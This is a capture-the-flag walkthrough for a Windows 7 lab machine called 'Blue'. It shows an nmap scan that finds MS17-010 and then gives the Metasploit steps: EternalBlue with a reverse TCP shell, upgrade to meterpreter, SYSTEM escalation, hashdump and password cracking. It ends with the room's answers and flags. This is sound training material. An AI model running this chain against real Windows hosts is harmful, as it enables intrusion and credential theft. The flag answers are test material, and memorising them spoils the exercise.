# Blue 

VM for offline use: `https://darkstar7471.com/resources.html`

### Task 1 Recon

1. Scan the machine

```
db_nmap -sV -vv --script vuln 10.10.171.109
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 15:56 GMT
[*] Nmap: NSE: Loaded 149 scripts for scanning.
[*] Nmap: NSE: Script Pre-scanning.
[*] Nmap: NSE: Starting runlevel 1 (of 2) scan.
[*] Nmap: Initiating NSE at 15:56
[*] Nmap: NSE Timing: About 85.71% done; ETC: 15:57 (0:00:05 remaining)
[*] Nmap: Completed NSE at 15:57, 34.47s elapsed
[*] Nmap: NSE: Starting runlevel 2 (of 2) scan.
[*] Nmap: Initiating NSE at 15:57
[*] Nmap: Completed NSE at 15:57, 0.00s elapsed
[*] Nmap: Pre-scan script results:
[*] Nmap: | broadcast-avahi-dos:
[*] Nmap: |   Discovered hosts:
[*] Nmap: |     224.0.0.251
[*] Nmap: |   After NULL UDP avahi packet DoS (CVE-2011-1002).
[*] Nmap: |_  Hosts are all up (not vulnerable).
[*] Nmap: Initiating Ping Scan at 15:57
[*] Nmap: Scanning 10.10.171.109 [2 ports]
[*] Nmap: Completed Ping Scan at 15:57, 0.01s elapsed (1 total hosts)
[*] Nmap: Initiating Parallel DNS resolution of 1 host. at 15:57
[*] Nmap: Completed Parallel DNS resolution of 1 host. at 15:57, 0.00s elapsed
[*] Nmap: Initiating Connect Scan at 15:57
[*] Nmap: Scanning 10.10.171.109 [1000 ports]
[*] Nmap: Discovered open port 139/tcp on 10.10.171.109
[*] Nmap: Discovered open port 135/tcp on 10.10.171.109
[*] Nmap: Discovered open port 445/tcp on 10.10.171.109
[*] Nmap: Discovered open port 3389/tcp on 10.10.171.109
[*] Nmap: Discovered open port 49153/tcp on 10.10.171.109
[*] Nmap: Discovered open port 49154/tcp on 10.10.171.109
[*] Nmap: Discovered open port 49160/tcp on 10.10.171.109
[*] Nmap: Discovered open port 49152/tcp on 10.10.171.109
[*] Nmap: Discovered open port 49158/tcp on 10.10.171.109
[*] Nmap: Completed Connect Scan at 15:57, 1.27s elapsed (1000 total ports)
[*] Nmap: Initiating Service scan at 15:57
[*] Nmap: Scanning 9 services on 10.10.171.109
[*] Nmap: Service scan Timing: About 44.44% done; ETC: 15:59 (0:01:08 remaining)
[*] Nmap: Completed Service scan at 15:58, 80.63s elapsed (9 services on 1 host)
[*] Nmap: NSE: Script scanning 10.10.171.109.
[*] Nmap: NSE: Starting runlevel 1 (of 2) scan.
[*] Nmap: Initiating NSE at 15:58
[*] Nmap: NSE: [firewall-bypass 10.10.171.109] lacks privileges.
[*] Nmap: NSE Timing: About 99.91% done; ETC: 15:59 (0:00:00 remaining)
[*] Nmap: Completed NSE at 15:59, 60.25s elapsed
[*] Nmap: NSE: Starting runlevel 2 (of 2) scan.
[*] Nmap: Initiating NSE at 15:59
[*] Nmap: NSE: [tls-ticketbleed 10.10.171.109:135] Not running due to lack of privileges.
[*] Nmap: NSE: [ssl-ccs-injection 10.10.171.109:3389] No response from server: ERROR
[*] Nmap: Completed NSE at 15:59, 0.37s elapsed
[*] Nmap: Nmap scan report for 10.10.171.109
[*] Nmap: Host is up, received conn-refused (0.0095s latency).
[*] Nmap: Scanned at 2023-01-13 15:57:16 GMT for 142s
[*] Nmap: Not shown: 991 closed tcp ports (conn-refused)
[*] Nmap: PORT      STATE SERVICE            REASON  VERSION
[*] Nmap: 135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server? syn-ack
[*] Nmap: |_ssl-ccs-injection: No reply from server (TIMEOUT)
[*] Nmap: 49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_smb-vuln-ms10-054: false
[*] Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
[*] Nmap: | smb-vuln-ms17-010:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2017-0143
[*] Nmap: |     Risk factor: HIGH
[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
[*] Nmap: |        servers (ms17-010).
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2017-03-14
[*] Nmap: |     References:
[*] Nmap: |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
[*] Nmap: |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
[*] Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
[*] Nmap: NSE: Script Post-scanning.
[*] Nmap: NSE: Starting runlevel 1 (of 2) scan.
[*] Nmap: Initiating NSE at 15:59
[*] Nmap: Completed NSE at 15:59, 0.00s elapsed
[*] Nmap: NSE: Starting runlevel 2 (of 2) scan.
[*] Nmap: Initiating NSE at 15:59
[*] Nmap: Completed NSE at 15:59, 0.00s elapsed
[*] Nmap: Read data files from: /usr/bin/../share/nmap
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 177.28 seconds
```

2. How many ports under 100 are open?

3

3. What is this machine vulnerable to? (ms00-000 tag)

ms17-010

### Task 2 Gain Access

1. Start Metasploit

2. Find the exploitation code we will run against the machine. What is the full path?

`exploit/windows/smb/ms17_010_eternalblue`

3. Show options and set the one required value. What is the name of this value?

RHOSTS

4. Set payload to `windows/x64/shell/reverse_tcp`

5. Run the exploit

6. Background the shell with CTRL+Z

### Task 3 Escalate

1. Research online how to convert a shell to meterpreter shell in metasploit. What is the 
name of the post module we will use? 

`post/multi/manage/shell_to_meterpreter`

2. Select this (use MODULE_PATH). Show options, what option are we required to change?

SESSION

3. Set the required option, you may need to list all of the sessions to find your target 
here. 

4. Run! If this doesn't work, try completing the exploit from the previous task once more.

5. Once the meterpreter shell conversion completes, select that session for use

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. 
Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return 
that we are indeed system. Background this shell afterwards and select our meterpreter 
session for usage again. 

7. List all of the processes running via the 'ps' command. Just because we are system 
doesn't mean our process is. Find a process towards the bottom of this list that is running 
at NT AUTHORITY\SYSTEM and write down the process id (far left column).

2028 conhost.exe

8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is 
the one you just wrote down in the previous step. This may take several attempts, migrating 
processes is not very stable. If this fails, you may need to re-run the conversion process 
or reboot the machine and start once again. If this happens, try a different process next 
time. 

### Task 4 Cracking

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of 
the passwords on the machine as long as we have the correct privileges to do so. What is 
the name of the non-default user? 

Jon

2. Copy this password hash to a file and research how to crack it. What is the cracked 
password?

alqfna22

### Task 5 Find flags!

1. Flag 1? This flag can be found at the system root. 

location: `C:\`

flag{access_the_machine}

2. Flag 2? This flag can be found at the location where passwords are stored within Windows.

location: `C:\Windows\System32\config\`

flag{sam_database_elevated_access}

3. Flag 3? This flag can be found in an excellent location to loot. After all, 
Administrators usually have pretty interesting things saved.

location: `C:\Users\Jon\Documents\`

flag{admin_documents_can_be_valuable}